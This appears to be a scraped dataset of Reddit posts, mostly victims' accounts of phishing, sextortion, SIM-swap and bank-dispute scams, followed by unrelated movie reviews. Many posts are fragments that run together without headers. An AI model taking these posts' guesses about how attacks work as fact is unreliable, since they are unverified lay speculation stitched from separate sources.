You filed the dispute for unauthorised transactions, however, all the payments were performed through the digital wallet (Apple / Google Pay). Also, we can see that you have willingly provided your card details and confirmed the connecting of the digital wallet through the push notification on the N26 App, or through the link in the SMS you received on your phone.

\&nbsp;

In order for a phone to sync to (Apple / Google) Pay, it requires access to the cardholder's N26 account which includes knowledge of the account username, knowledge of the app password, knowledge of card information as well as the code sent by SMS to the account holder's phone. This is considered as negligence according to N26 terms and conditions.

In addition, for a card to be associated with a digital wallet with a unsynchronised phone, this cannot be done without knowledge of the code sent by SMS to the account holder's phone.

\&nbsp;

Please check the link below showing the awareness raised by EbayKleinanzeigen about accepting such payments:\&nbsp;

\&nbsp;

Your chargeback case has been closed, please solve the issue with the merchant directly or through the police.

Have a great day,

N26 Team”

&#x200B;

They have closed my case on the grounds of what a bank would call ""gross negligence"" and refuse to resolve the issue of unauthorised transactions on my account that sent 90% of my account to a organisation that I have never heard of in a country I have no connections to. Of course I released my card details and account information, that is exactly how phishing schemes are developed, engineered and how they succeed. A phishing attack is exactly defined as “a form of social engineering where attackers deceive people into revealing sensitive information. Phishing attacks, often delivered via email spam, attempt to trick individuals into giving away sensitive information or login credentials.” 

After some further research, it seems like it should well be possible to dispute this case in a court of law by proving that this wasnt in fact ""gross negligence"" because of the impressive and well executed forgery of the emails, websites, portals and 2FA procedures of both Ebay and N26 but I am uncertain, scared and a bit desperate. I have never been to court for such a thing, I am struggling with money as it is and losing such a case would be insult to injury and maybe even impossible to recover from for my life here in Berlin.

I feel like such an idiot now but it totally got me, hook line and sinker. He had me going for about 10 minutes, I was busy @ work, freaking out to the point of fight or flight mode about my bank account, and 100% believed I was on the phone with the fraud department he played his part so well.

I literally gave up my online banking password like a moron and it didnt hit me until about 3 minutes later he asked for the first 12 digits of my debit card and it completely hit me all at once what was going on immediately.

I mitigated the damage but I am posting this to make sure others realize just how fucking convoluted and intricate these phishing attempts are getting.

The first 2 times I clicked nothing happened so I copied the link of the email and pasted it in my browser and then boom a new email draft was created. It was addressed to some random jumble of letters and numbers so I knew at once that the whole thing was baloney. I did not click send and I deleted all the drafts that this link had created as well as deleting all of the spam emails that were similar. I did not send any information to this fake email nor did I send any emails at all.

Stupidly, I decided to download cheats for a game called CS:GO when I was drunk and bored. I would never have been so stupid if I was sober. I knew it was malware immediately because I was getting emails of someone unknown trying to access basically all my accounts. 2FA saved me from losing anything. I change all passwords and they know again. I factory reset and change passwords again and I get an email. An email containing all of my passwords, sent to all of my emails. The email showed a screenshot of both my monitors (I can verify they are definitely my monitors that are in the screenshot), and then a document demanding $1,150 or they'll send all my contacts a video of me masturbating. The inconsistencies:

1. I don't have a webcam
2. They say they hacked me on 2/12/2022 but the screenshot shows the date 29/09/2022

I am making this post to ask... Is it possible for malware downloaded on a computer to bridge over to a phone? In that case, the threats could be true

Is there anything else that any of you notice in the email that is inconsistent with phishing scams or does it look like it could be genuine?

Is there anything I can try and do to avoid this from happening? I have until wednesday at midnight (24 hours from the time I made this post) Before he is alledgedly going to ruin my life.

“I think you’ll find photo 4 interesting”, and there’s a link attached.

Then, a few days later, “actually I think you’ll recognise photo 12”, with a link attached.

Most recently, though, they sent an email with images attached to escalate things. I didn’t open it, I just saw in the preview that said, “perhaps I should have sent you these earlier”.

1673284252.0,Became a target of a email spoofing attack - how?,"I received an email from *no-reply@<popular crypto exchange domain.com>* telling me I received some crypto from so and so, and to click here to claim. Some observations and questions:

1. It was clearly a phishing email because I don’t have an account associated with this email

2. I’ve observed that this exchange always greets me by first name in their real email. This phishing email did not, as they would not know my name and appear to be casting a wide net

3. The bottom of their email indicated their Europe division. I’m in the USA so I deduced that my email was probably caught in a wide net cast upon European customers. I don’t expect legitimate emails to contain their European counterpart signatures.

4. It’s highly unusual that someone sent me crypto, and then I have to “click here to claim”. Though I will admit, the overall style and presentation of the email is 99.999% legit aside from very minor details. I initially thought someone unusual had actually sent me crypto until I started to re-read the email looking for phishing indicators

5. I somewhat understand email spoofing, but it’s still a little over my head. How was the malicious actor able to spoof their email to come to me appearing to be the legitimate domain of this large exchange? Could they have registered a domain and swapped out letters with identical characters (wouldn’t the business also register alternative domains to prevent others from registering it?). If not, did they alter something in their email server settings? I thought there’s security countermeasures to stop 100% spoofed emails?",phishing,1591,268,27,1

1672163390.0,"Cautionary tale: Nearly got phished for my banking password via ""instant app"" on Android","I have a pretty crazy ""near miss"" phishing story to tell. And a few questions / mysteries to solve.

Yesterday I got a notification from my online banking app (I'm with a major Canadian bank). The app sent me a push notification that says ""sign in requested"" and then said ""when dec 26, 2022 at 10:12PM PST"". At bottom of the notification there are two buttons: ""don't allow"" and ""allow"".

I had seen these messages before when I log in to my online banking from a computer. It's a 2factor auth that prevents fraud. That said, normally this notification sends me the location of where the login attempt was made. I thought it was a bit strange that it was missing the login info.

I was half asleep and I clicked on something (presumably ""don't allow) and the it said something like ""if this was not you, please reset your password"". And then it asked me to put in my banking info. At this point red flags went off in my head. This was very suspicious.

On one hand, what I was looking at looked exactly like the app I had used many times... but on the other hand, it was missing the location info and it seemed risky to me to enter all my security info in this way.

I decided to call RBC bank and ask them for the ""location info"" for the login. Once I passed their regular security questions the customer service rep told me that there had been ""no login attempts into my account"".  What the heck was going on?!

So I decided to log in using my laptop and I didn't get any ""login attempted"" messages there either.

So here's my theory:

1. I recently turned on a setting on my android phone called ""upgrade web links"" from the Google Play store settings. This setting turns on ""instant apps"" which are described as follows ""click certain links, the instant app may open and you'll be able to use some of it's features, without actually installing the full app.""
2. I think a phishing app ""spoofed"" my banking app by using this instant app tool. Normally it would open on a browser and I could see the URL, verifying that it's a fake URL of somekind. But that's not possible with an instant app (or is it?).
3. the fake banking app then asked me to reset my password. (which thankfully I didn't do).

If I'm right about all this, wow, that's one hell of a scam! that would have so many implications for security. Namely that banks now have to worry about this novel attack vector. It means that ""instant apps"" are a threat and should be turned off. It means that we should be warned by our banks what the ""right"" way is to log into our bank and reset our passwords when needed"".

What else does this mean?Am I out to lunch here?

Has anyone else experienced this?  


update #1 : Ok, maybe this was a false alarm. While I still think it's possible to use Instant Apps to ""spoof"" an app (which probably makes them risky), I think it's equally possible that this was a legitimate login attempt from an 3rd party app that needs access to my banking info. It ""pulls updated bank balance info"" at around 10pm every day. I recently reconnected this 3rd party app to my bank account. So perhaps this is the culprit. To reproduce the problem, I tried login into this 3rd party app, and sure enough it gave me a ""sing in requested"" push notification that is missing both the ""device name"" as well as ""location"".

Okay, I’m an absolute idiot when it comes to hacking, or cybersecurity, so feel free to remove this post if it’s stupid but I really wanted to ask this on here. I’m pretty cautious with the apps I use, browsing and passwords and this incident happened to my new phone I hardly ever use other than for taking pictures and using like 3/4 go-to apps. None of my social media accounts have been hacked in the past until a few days ago. So I was out with a friend, I didn’t touch my phone for hours because living in the moment etc, and on our way home I popped into an amazon freah shop in a very busy area of london, however the store was empty, only a security guy standing at front of the shop. I log into amazon app, scan the entry code,  go in and do some food shopping. Whilst I’m in the store I see this discount qr code (for black friday), I quickly scan it and it opens Safari and asks me to log into my amazon account again, which I do. I don’t remember anything else, I couldn’t be bothered to claim this discount code so I quit safari, I lock my phone, carry on shopping and go home. Within an hour, all of a suddent I start getting notifications from my instagram so I go and check what’s going on. It turns out that I  sent dms to about 20 of my followers of totally random photos from my camera roll(some recent ones, some from months back). I start to panick (first I thought I must have done it myself by accident) and as I’m messaging someone apologising about it, I realise that more of these had been sent during the time I was responding to that person. It felt really creepy so I immediately went to change my apple id, and password for instagram after which it had stopped. When I told my friend who’s studying hacking and is more up-to-date with scams in London, he said it’s quite common for people to put stickers of false qr codes on top of legit qr codes and amazon fresh having pretty much zero staff inside the store is a great place to do this. Could this be what happened to me and is this actually a common phenomenon? The thing is I can’t remember going on any dodgy websites where you come accross pop-ups and what not so I’m genuinely confused. Also, am I safe now that I’ve changed pretty much all of my passwords and logged out of all decives?",phishing,2279,438,36,1

* When I tried to create a new account on expocoin .com, whatever email I used it said that I already used that email.

Anyways today, I’m on this dating site (I’m a fit male and above average looking I suppose) and I matched with this gal and she played it well and asked about my ancestry because I speak two languages and I explained I’m Scandinavian and I started seeing a lot of social engineering hints..see started using sympathy and guilt for things and then way out of nowhere she comes out and says she’s a founder of some far right organization. I think to myself what in the actual fck?! And that she has to
Protect her identity etc. it was all so strange. I never asked about it and she kept brining it up. Her profile pics seemed real and she was good looking.

I’m a normal masculine American. All these red flags were set off and she was like oh you’re probably a fed anyways and that she belongs to a radical right well known group but she doesn’t do anything illegal. The dating app was bumble and I saw she changed her location twice to Florida and then to Warsaw Poland. I think whoever it was was phishing to either A set people up or B recruit people.

Then today I saw she sent me (via Facebook messenger) a link about a certain reputable airline. I didnt think much about it, It just says win something. So, I thought she wants me to also join this thing since we are planning to go on a trip and getting a free ticket would be nice for my aunt and I. 

Anyway, I opened the link, and immediately there was like a sort of, survey about that airline. Headline says, if you answer this survey you might win a trip to any destination you want.

Anyway I immediately realize this is a scam after opening the link. The spelling, photo etc. are all so fake and obvious once you open it. 

I immediately closed it. Didnt click or do the survey, didnt provide any info at all. 

I have a few questions: (I was using my android mobile btw)

1. Was this a phishing link? 
2. Since I didnt provide any info, and didnt do the survey and closed it immediately, Am I safe?
3. By opening this link via messenger (since that's where my aunt sent it to me) am I safe?
4. Will I/my fb account be harmed by opening this link?
5. Did I just expose my phone with virus/malware by opening this link?
6. Will this link be automatically sent to all my contacts without me doing anything?

1666664869.0,Fell for an employment phishing scam. Is My Identity Compromised?,"Long story short, I fell for an employment phishing scam through Indeed but only got far enough into it before realizing to where the phisher only has a picture of my state ID, email, and phone number. 

I’ve been advised by the FTC to put a credit freeze on my accounts through the three credit bureaus, as apparently just with an ID they can file for loans or take out things under my credit. But I’m wondering if this possible, because I recently had a legal name change, to a completely different first and last name. 

While this information was up to date on the photo ID I sent the phisher, it’s not with TransUnion/Equifax/Experian. As far as they know my current name doesn’t exist to them. 

The only way I can put a credit freeze on my accounts with them is to update them of my new legal name. But that would make the name the phisher has access to via my ID photo more susceptible to being stolen, wouldn’t it? 

Should I update my legal name with the credit unions to put the credit freeze on, or keep it as my old different name the phisher never received? Does it matter at all or am I just overthinking it and should STFU and try to get the name updated and the freeze on on asap?",phishing,1197,227,18,1

Some days ago I was in a friend´s house when I decided to open instagram to find that a crypto related story was posted in my account. Obviously I didn´t post it, so I decided to simply change password, enable 2FA and carry on. The day after, I got some emails from facebook saying a new email address was associated with my account and I got really worried, so did the same as I did with Instagram, enable 2FA and change password.

Evertything was going fine until yesterday night, I tried to log in into my facebook account and it game me a warning saying I was trying to use an old password (the one I changed just some days ago). After that I went to gmail and saw that I had 4 mails coming from facebook on the trash bin with codes to change password and the email adress, and I started panicking because that would mean this hacker also had access to my account even if I had the 2FA active (received login notifications on my phone). Proceeded to send my ID to facebook in order to get account back and in only 30 minutes I was back in. I also changed my gmail account password, enabled the authenticator app 2FA and performed a hard reset on my phone.

I know that my PC is safe because I have a premium software and now that I hard reset my phone I think that the problem is gone.

Does all this mean that this hacker had the access to my phone? I have now installed some antivirus on my phone and apparently it´s clean, am I safe now?

WHO

&#x200B;

An account on Instagram, requested buying my art as NFTs on September 11th 2022.

It directed me to sell these to her over a website she'd sent me a link to, namely mintbase . digital.

HOW

&#x200B;

Before doing anything, I checked ""mintbase . digital legit"" but couldn't find anything suspicious.

&#x200B;

I created an account, with a unique password, and cases like this is why one is well advised to use unique passwords for each site.

1664872488.0,I'm Being Hacked and I Need Some Advice (sorry),"Ok, please don't berate me for this but I need some advice. I'm in an emergency situation and in between jobs, but needed a loan within a few days. My bank declined me (my parents took out some student loans on my account apparently), and so I went the route of trying for an online loan. I realize that this is always dangerous (please everyone know for the future this given what I'm experiencing) but it was worth it to me to try. Of course, now I'm being emailed with all of these obvious scams, most of which are coming from the same @ address. However they're being a bit weirdly aggressive given that I have no money, hence the loan (as would always be the case I would think, what an ironic scam industry), which is bizarre- anyways, I find this comical but this morning I noticed they took my full $8.00 out of my bank account... worth it, clearly. I'm closing and reopening my account of course. But frankly what I don't care for is the following- they have started emailing me at an email address that I never provided on any ""loan"" page with more scamming, this time targeting my job search, posing with fake job board emails and the like. I found this stupid and reported them to the FTC and the FBI's cyber crime tips page.

Here's why I'm asking for advice though- I had an incident occur shortly after doing so where they visibly accessed my computer and logged out of an account in an app of mine right in front of me- wasn't anything natural, it was def remote accessing of my computer. I think they were trying to phish me or something by having me reapply the credentials. Anyways, I'm on a MacBook at home, and am seeking an explanation as to how they are doing so, as well as what subreddits I can try to get more information about this. I'll be installing a VPN tomorrow, and am taking other precautions (I have and will be switching up my account credentials regularly) but as far as security goes (with remote accessing especially) I could use some advice. I'd like to know exactly how that could be done and what can be done about it.

I definitely will never try and get a loan online ever again, and I will treat security with the utmost importance from here on out. I'm making it a life lesson, please don't yell at me

1663772115.0,Phishing emails from my own email address,"TL;DR - I’m receiving phishing emails from a non-spoofed internal alias email address and hosting tech support can’t help. 

I’ll go into a bit more detail in order to give as much information as possible. We had a website “a. com” hosted at WIX. WIX handles emails sent to your hosted site using Google so you have a Google mail account over there and that’s how you get emails. We changed our name from “A” to “B” and launched a new site hosted at godaddy under the url “b. com”. Emails are now handled using Office365. 

Main email address is now “redmond@b. com”. Because everything was in transition I created an alias for redmond@a. com in order to be sure I would still get those emails and they would not be lost. 

Here’s the issue: a couple of us have been receiving phishing emails from our alias addresses. When you hover over it, it is the actual address but you can tell it’s phishing from a link that is attached further down in the email. These are often pointing to a Power BI dashboard. You can’t report it as spam or block it because it’s your actual email address and office 365 doesn’t allow that. Has anybody encountered this? Can you help me find where what I need to do in order to block these? Everyone has changed their passwords and I’ve reached out to our hosting tech-support several times and they don’t know how it’s happening other than to say they think the users might have been compromised. However, we did change our passwords and they’re still coming through. Thanks for your help everyone!",phishing,1527,275,25,1

I received a text from what seemed to be the local health service warning me I came in contract with Omnicron and telling me to order a test kit at a link.

1660755468.0,Data breach-email but customer support doesn't seem to know what to answer me.,"Hi! I didn't know where to ask this, so I hope this is the right spot.

I got an e-mail last night from an online clothing store, saying that there was a third party data breach that made it possible to get my information from this online store. It said my information, like adresse, phone number, name, age etc was available. But not my card information etc.

I found it odd that in this email, it said ""hello \[random male name\]"" When that is not my name and it would be odd for them to assume this name in any way.

When I checked where the seemingly legit email came from, it was coming from a ""amazonses"" webiste/whatever, which I thought  was some shady phishing shit. Obvously I didn't click any links.

I went to the clothing store's support page and asked if they had sent me this email and why they had used a random name, if so.

They only replied that ""yes they had a third party data breach"" (but that it was not their fault). I said, this I understand, but I wanted to know if the email I got was legit, and I showed them a screenshot of the email address and how it adressed me as another random name. And I also asked if this breach had indeed made my home adresse, phone number etc available. 

They only replied ""yes it might have been taken but they had no way of knowing.""

I then asked if the email was legit or not (again) because the original email seemed like a phishing attempt, and not an actual breach in their webpage. But I have yet not recieved any answer.

So. Can anyone explain to me what has actually happened? 

TL;DR 

I get an email from the ""store"" (looks like fake email. )

I do not open anything. I just read the email and closed it.

This email states that the account was terminated due to suspicious activity, and that whoever it was, had access to my personal information. 

When I asked the actual store, they say ""yes there was a breach"", but a third party or something, and not ""their fault"". They say my account is terminated. But not why/what the activity was, etc.

Due to my youth and lack of financial literacy I did not know what phishing was and was unfortunately scammed.

Ive reached out to my bank multiple times through their fraud unit but each time my claim has been denied on the premise that I posed my own account at risk. In addition the scammer that stole from me did a SIM card swap rendering my phone useless as they stole from me and communicated with my bank as if they were me. Thus I was robbed without even knowing it. 

I was told persistency is key with these kind of things, but I’ve been dealing with this issue for months and I am still getting the same responses or no responses at all. 

I filed a police report when I first got scammed and tried to follow up with the detective on my case with no avail. And I’ve even reached out to my phone company for proof of a SIM card switch but they won’t provide the paper work. 

Im at my wits end to the point that I’m
thinking I should just count it as a loss and move on. Mainly due to the stress and the toll it has taken on my mental health.  However, due to the fact that the money taken from me was a pretty big sum and to pay my college tuition I feel a bit hesitant.  Im also first gen and have been saving and paying for school on my own due to my parents inability to provide financial support which makes it even harder to let go of this matter.

(I don't think my email account automatically adds that title to my email address on my incoming mail, bc other messages I've received seem to be preceded by whatever I am saved in the address book as) 

So - what is going on here? Am I crazy to wonder if this potentially represents a specifically targeted attack?

1655474527.0,Scammer phished my phone number,"I received an email this morning at my work email address from someone pretending to be my boss (it had his name in the header). They said they had some urgent work and could I please send my phone number so they could communicate by text message. So I replied back with my cell number.

I next (stupidly) tried calling them from my wife's phone, since her carrier allows calls and texts from Canada. They started texting her too now. Then I noticed that the little circle outlook shows next to an email, with the sender's initials in it, was a different color than normal for my boss.

About 30 minutes later I was another missed call from another number I don't know.


A bit of additional information:
-I recently made a BUNQ (online bank) and Trade Republic account, both are trustworthy, but I also needed to confirm my information on both, so maybe some kind of leak could have happened?

So, a few months ago I started getting emails from Netflix, the real Netflix email (I didn't know it was the real one). First one was welcoming to the platform, e.g: Welcome, John!. FYI, I have never made a Netflix account, and my name is definitely not John (i'm a woman). Since I didn't have any netflix account I thought it was some sort of hacking technique, It maybe wanted me to click on the links and they would rob my information, hence why I simply marked that email adress as spam and forgot about it.

Everything was normal until today, that I thought about it and decided to log in on Netflix with my email. Restablished the password and created a new one via a link that I received on email (I didn't create the account so I didn't know the password). I was really surprised when I saw five different profiles with a large history view of different movies and series. Decided to check where they were logging from and it's from another country, and continent from mine. I'm in Spain and they are in Honduras.

I believe this isn't a case of phishing, because I checked their payment information and they've been paying for 3 months now, so my question is, why would anyone make an account with someone else's email? It doesn't make sense because if you had to change the password you would need access to that email (they actually tried once, I got an email). And again, they created this account on february, so a few months have went by.

I have looked this up online and it doesn't seem like it has happened to many people, and the ones who have talked about it blame it on a phishing case, but my situation really doesn't look like it.

We tried reasoning him, even after explaining how scammers leverage online profile to make them believe they have a connection with them and trying to get him to show us some proof of validity, he refutes and degrade the people he loves in order to not shatter his reality as he is in too deep financialy.

We called the police, had them visit him to discuss, he didn't flinch and continued saying he was under control. Obviously he doesn't want to provide any information because ""it could ruin the project"".

1696975704.0,Beware of Crypto Scams: My Personal Experience,"Hey Reddit Community,

I hope you're all doing well. Today, I want to share a deeply personal and embarrassing experience that I recently went through. I believe it's essential to talk about it openly, not only to get it off my chest but also to warn others about the dangers of crypto scams.

To give you a brief overview, I met someone here on Reddit, and we struck up a friendship. We never discussed crypto until I casually mentioned that I had mined some coins before the major market shift. That innocent conversation led to me being introduced to the world of decentralized finance (DeFi) wallets and the promise of passive income.

I started small, naturally cautious, and things seemed to be going well. I gradually invested more, pulling from my savings, and even took out a $10,000 loan. The allure of earning more than my stable but modest income was irresistible. Things escalated, and soon I was earning significant amounts, or so I thought.

Then came the turning point. I received an email from the loan company, informing me that I was pre-approved for more funds. I should've recognized the warning signs and resisted the temptation, but I didn't, and it led to disastrous consequences.

Cutting to the chase, I ended up with $47,000 NZD ($40k of that was the loan and 4k my own personal money that I had saved over time) in my account, feeling on top of the world. But just as quickly as it came, it vanished. On a Monday morning, my account showed a devastating $0 balance. Now, I'm left with a loan I can't afford, a heart full of regret, and a mind clouded with dark thoughts.

I share this not for pity but as a cautionary tale. Please, be vigilant. Scammers prey on our vulnerabilities and dreams. Don't fall into the same trap I did. I know I can't change what happened, but if sharing my screenshots and story can help even one person avoid this nightmare, it will be worth it.

Remember, it's okay to ask for help and support. We're a community, and together, we can navigate the often treacherous waters of the internet.

Take care,

1650520166.0,Spam email marked as secure?,"Okay so, I'm new to reddit so excuse me if I don't know how everything works yet!

Yesterday I received to emails from no-reply@microsoft.com telling me someone accessed my account from Russia. Looking back I now see two small typos but I didn't even notice it, so I clicked on their ''report user'', and it sent an email to an @ googlemail.com and that's when I realized I was scammed, because why would Microsoft send me to a Google account.

I contacted the team immediately because some things felt off:

1. On my log in activity there was no log in besides my own
2. The Google account, obviously
3. But the thing that weirded me out the most is that I had been receiving emails from this account since 2016

I didn't even question the email because I could see they had been sending me emails since 2016, and since a lot of companies use an no-reply email I unfortunately fell for it. What's really weirding me out is two emails that I found from this address, one from 2020 where they somehow knew about an Amazon purchase and sent me an email about adding the delivery to my outlook calendar (what's even weirder is that this particular email is marked up top as ''This message is from a trusted sender''?????). The other one is from 2016 welcoming me to my outlook account (now I'm not really sure why I don't remember but I've had this email since 2010 and it was a hotmail account, so maybe it was that?).

Microsoft has confirmed the email does not belong to them, as theirs is way longer, so I'm wondering if anyone else has had this happening to them?

I checked the link on link checking websites and apparently it really directly redirects to youtube. After I received a similar message from a mutual friend, I spoke to her and she said she lost her credentials by clicking on such a link and logging into a fake fb website. (I think on the iPhone)

1697387919.0,Little Miss Rawther Malayalam Movie Review,"\#LittleMissRawther #Malayalam #MovieReview

Here is my non spoiler review of Little Miss Rawther Recently released malayalam Movie

[Little miss Rawther](",moviereviews,155,20,0,0
1697134409.0,The John Wick series is a masterpiece.,"These films get a lot of praise as action movies. And that is all very much deserved. As action films, they are unparalleled in their creativity, craft, and execution. In an era where so many action movies rely on CGI and editing tricks, the dedication to making the fight scenes feel real is astounding. What surprised me as I went through the series is how much more there is to these films. 

While the narratives are pretty basic, all the performances are top notch. And the dialogue never once feels cringey or awkward. The stories are simple in construction, but emotionally complex. And those carry over from film to film. Everyone keeps asking John why he doesn’t stop and he keeps giving excuses when the truth is plain to see. He doesn’t stop because he can’t, as much as he wants to, even though he really doesn’t. 

What stands out the most to me is the cinematography and design. I have never seen a movie pop with as much color and energy and these films do. The Killa Harkan scene in John Wick 4 is one of the most beautiful scenes in any movie ever. And it’s one of many. 

What makes me want to show so much appreciation to these films is that so much of the effort wasn’t necessary. The films would have all been successful even if it was a more “generic” product. To see this level of artistry applied to this kind of movie is just so refreshing.",moviereviews,1365,252,26,0

1697088366.0,No One Will Save You (2023) is interesting…,"This film got so much hate for some reason but I honestly find it so refreshing. It was original, experimental, the twist was very wild.

1697085072.0,Joker 2019,"All the Joker 2 hype got me to finally watch the first one. It was okay at best. Every time he started laughing or dancing I was taken right out of it. Not hating on those who liked it, but I think it was completely overrated ",moviereviews,226,46,4,0
1697052931.0,Blue Beetle,"So I saw Blue Beetle and I liked it.  It’s got a lot of issues, though.  The first half of the movie feels pretty boring and generic.  I think they could have done a better job of developing the main character.  There’s a persistent feeling in the movie that he doesn’t have a lot of agency and just gets pushed around by the plot.  That said, if you stick with it for a while, there’s a lot of fun to be had here.  I thought the family was kind of annoying and obnoxious at the beginning when there was a lot of forced humor, but they won me over once the plot was more underway.  There’s actually a few genuinely sweet character moments that give the movie some more emotional weight.  Also, as a comic book fan I loved the references to older versions of the character.  I loved the campy fun of seeing them use old Blue Beetle’s silly flying bug car from the sixties.  The movie also has some political commentary about US imperialism that gets more overt as the movie goes on until they’re all but calling Ronald Reagan a genocidal monster.  I kind of loved that.  I suspected that a lot of other people would hate it, but weirdly enough the only people I can find angry about this movie’s politics are people who are mad that a character calls Batman a fascist.  Pretty infantile if you ask me.  Anyway, I made a video about it if you wanna hear my more in-depth review.  I also talk a bit at the end about the politics around this movie and the weird trailer backlash.

1697033098.0,Dumb Money,"Unlike the typical rich versus the poor comedy, *Dumb Money* is based on real people and actual events.  As such, it comes off as *Caddyshack* crossed with *Margin Call*.  The problem with *Dumb Money* is that it's not as raunchy as it thinks it is.  The good guys are underdogs, but are a fairly straightlaced bunch of working stiffs and college kids.  The movie isn’t as wonky as it should be, either.  The movie would have benefited tremendously from a few absurdist asides that explain why things are happening, ala. *The Big Short*.  Also, if you hadn’t followed the GameStop stock saga a few years ago, you may be scratching your head over the why of what is going on.  That said, the movie features noteworthy performances by Paul Dano and America Ferrara that effectively ground the movie.  As financial analyst Keith Gill, Dano manages to be both funny and relatable.  Ferrera also brings a hearty dose of righteous anger as put-upon nurse Jenny.  Between this performance and *Barbie*, she’s having a solid year.  The movie also captures the social media frenzy that surrounded GameStop stock.  With its frequent montages of gifs, YouTube videos and reddit posts, the movie effectively shows how a bizarre notion like buying a company like GameStock to give hedge funds “the finger” went viral.  *Dumb Money* may treat the source of its inspiration lightly, but it is entertaining and occasionally moving.  **Mildly Recommended**.

1696942544.0,Drive (2011): Blown away by this near-perfect film,"Spoilers if you didn’t see the tag. If you haven’t seen it, stop reading, watch it and come back. 

2011 action drama Drive has been on my “interested, know little about it, will get to it” list since forever, having heard good things and little else beyond that and broad strokes about Ryan Gosling and obviously driving being involved. 

I finally watched it and this is now one of my absolute top movies - and I know everything about movies being a nut and snob and all that stuff regular people don’t love about movie nerds. 

Rewatching will be necessary for sure but setting aside the unfortunate “too big a coincidence” connections, my initial reaction was that it’s a near-perfect film. 

To the point where the theme is in the soundtrack.  It’s one of the only movies that makes me actually *hesitate* to read the book instead of wanting to run out and read it immediately. 

Because I don’t know how much artistic license was taken but from a scripting and editing level, it’s like Back to the Future in that there really are no moments that do not inform the greater story, there’s no fat. The story is told in a way a book cannot tell it.

And things that seem like nothing at first are extremely important to what you’re watching but you can’t see it until the end, really. 

It’s the story of one cycle of his moonlighting. The subtle rules of his work are clear from the beginning. He starts fresh every time. He doesn’t break rules. 

And then he breaks one and it couldn’t go worse. He only involves himself more when he sees she will never get out of her situation alive and doesn’t know she’s in one.  

And I love the ambiguity at the end. There is no means for him to start a new cycle anymore and we have no idea if he will survive if there was another to come. 

I didn’t get the choice in music until it literally drives home the theme right out loud as the film close by recalling the song that played when he drove her home from the shop. 

This is what it takes to be a hero to another person - a real human being.

Bravo! I don’t expect to see another crime/action drama this good anytime soon. 

Wow.",moviereviews,2129,395,32,0
1696868439.0,Doom. Im not sure why I love it so much,"It is known this movie was mostly hated when released. One of the main reasons is because holds a title, and attempts to be to some extent, a movie adaptation of the legendary videogame franchise of the same name.   
As an old time videogame enjoyer, I too was disgusted when I realized this when I watched it on release. It was all good, title included, as it is never obvious the title is because of the game, until certain part of the movie that confirms it is an adaptation.  
I rewatch the movie last night, and this morning again, and i still find the movie very enjoyable, I love the villain development and the pace. You find out what's going on at the same time as the characters and I find myself invested every time I engage with it.    
Don't get me wrong, it is predictable, and it is bland, it has plot holes, it also has dubious acting, and it overall makes no sense, although Rusamund and surprisingly Dwayne always keep me entertained and totally immersed. None of this is really reason for me to enjoy this movie so damn much.   
This is a horrible movie that I can't recommend, it's a rough experience with zero substance, forgettable and quite generic  
and I love every second of it. It is unclear why.  
 Unsupported but solid 10/10.",moviereviews,1255,227,32,0

not the greatest film ever but pretty good! it’s one of those films that’s mainly for kids but adults can enjoy too

1696799323.0,The Exorcist: Believer is terrible,"That’s all you need to know. Not only does it fail as a sequel to it’s 1973 predecessor, but even as a stand alone possession film it is a nothing burger in every possible way. Bland static characters, telegraphed plot line, fumbled religious themes and worst yet a boring demon. I’m not cultured, I’m no professional film analyst, but even I can see that despite being the same length as “The Exorcist” that first film accomplished more in one hour than the entirety of “The Exorcist: Believer.” As well, as seems so often to be the case with this trend of legacy characters, Ellen Burstyn is horribly and shortly utilized. 

To give one specific criticism, the first film made Reagan a CHARACTER, it gave us a lot to latch onto and made us feel intensely for her well being. Believer on the other hand reduced it’s possessed characters into set pieces and nothing more. We spend no time with them pre possession and only one gets an kind of attention or big air quotes “development” in the script. You’re expected to care just because they are kids which hardly cuts it anymore in modern horror. Worse still, Reagan was canonically younger than our two new Reagans and went through a literal hell of a lot more. 

Another thing that really annoyed me is how tame it is.  Believer is contending with an origin steeped in boundary pushing obscenity and the perversion of religious iconography that even 50 years later gives audiences pause. Yet our demon has maybe one page worth of forgettable lines and doesn’t do anything nearly as memorable as the original or even that generally shocking. This is “Syfy presents The Exorcist” in comparison. If you’re still curious about this film, just wait till it starts streaming at home.",moviereviews,1730,301,27,0
1696812592.0,Reviews On Wonderful Story of Henry Sugar + The Other Wes Anderson Short Films,"I am a massive Wes Anderson fan but, I do have to admit I was disappointed by The Wonderful Story of Henry Sugar. There are great elements to it like the incredible production design, I love how the set changes and transformers like the set of a play. The visuals here are great so I do respect the short film but,  I could not get into the story. The fast dialogue and characters changing perspectives from narrating in the third person to going back into characters constantly just got tiring after awhile. Luckily, I did enjoy the other three short films considerably more. I thought the narration style made more sense in something like The Swan, where it was an older man reflecting on the traumas of his childhood. This style was easier to get into in 17 minute shorts as opposed to almost 40 minutes like Henry Sugar, and thought the quicker pacing of the other three short films made it easier to get into the stores. Also love seeing Anderson experiment with his style and make something creepier with it like The Rat Catcher, or something more tense like with Poison. I have a video I posted [here]( if anyone wants to here more in depth thoughts and ranking of these short films. ",moviereviews,1191,215,16,0

1696527724.0,Reptile (2023) Review,"Justin Timberlake stars in Netflix’s latest thriller about a real-estate broker who has been mysteriously murdered. Benicio Del Toro is the lead investigator whose past life landed him a new detective job in Scarborough, Maine. As the story progresses and more clues become unraveled, we get the sense that nothing is really what it seems and that the movie title may be a metaphor for the overarching plot. 

What I would describe as a slow burn thriller, this movie had its peaks and valleys. Some scenes you absolutely had to pay attention in order to see small details while others will have you losing your attention span. Being an NSYNC fan from my youth, I wanted there to be more J.T. but he didn’t really have the prominent role that I was looking for (which is okay). I also was not really a fan of the conflicting love drama with Benicio’s character. I get the writers were probably trying to play into the snake metaphor but the movie could have done without it and been 15 minutes shorter. I will give them credit for the story development as I do not like thriller/murder mystery movies that reveal key information that’s pivotal for the plot 20 minutes before the ending, making it impossible to guess the killer prior. 

Overall, I would rate the movie at a 6.1. While the story was a bit underwhelming it did have me hooked and guessing who the killer was. I ultimately was incorrect about the killer so my rating has to go up because of that. I did appreciate the scene where the cops were betting on who they thought the killer was. I found it to be a nice comic relief considering the dark tones of the film. I thought Benicio was by far the best actor in the film but his questionable backstory never came to really matter at all so I have to take some points away for that. My attention span was also waning in a couple scenes and that’s never a good thing when it comes to a slow burn thriller. The film also had some great intense scenes that I couldn’t look away from the screen, so points added for that. In review, I would recommend this movie to anyone looking for a low drama and somewhat intense murder mystery. Netflix films tend to be good but not great films, and this would fall perfectly into that category. 

